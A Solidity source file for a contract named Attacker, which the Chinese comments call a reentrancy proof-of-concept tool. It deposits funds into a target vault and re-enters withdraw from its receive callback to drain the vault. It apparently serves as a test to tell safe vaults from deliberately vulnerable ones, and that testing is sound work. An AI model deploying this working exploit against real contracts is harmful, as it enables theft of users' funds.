// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker（重入攻击合约 / PoC 工具）
/// @notice 存入一笔本金后调用目标 Vault 的 withdraw，并在 receive() 回调里
///         反复重入 withdraw，尝试在 Vault 清零余额之前把资金掏空。
///         对健康 Vault：重入时余额已清零，第二次 withdraw 回滚，攻击失败；
///         对埋雷 Vault：余额尚未清零，重入成功并掏空资金。
contract Attacker {
    IVault public target;

    constructor(address _target) {
        target = IVault(_target);
    }

    /// @notice 攻击入口，调用者需附带 >= 1 ether 的本金
    function attack() external payable {
        require(msg.value >= 1 ether, "send >= 1 ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
        // 若成功到这里，本合约已通过重入拿到资金；把本金与利润留在合约内便于断言
    }

    receive() external payable {
        // 只要目标里还有 >= 1 ether，就继续重入取款
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}
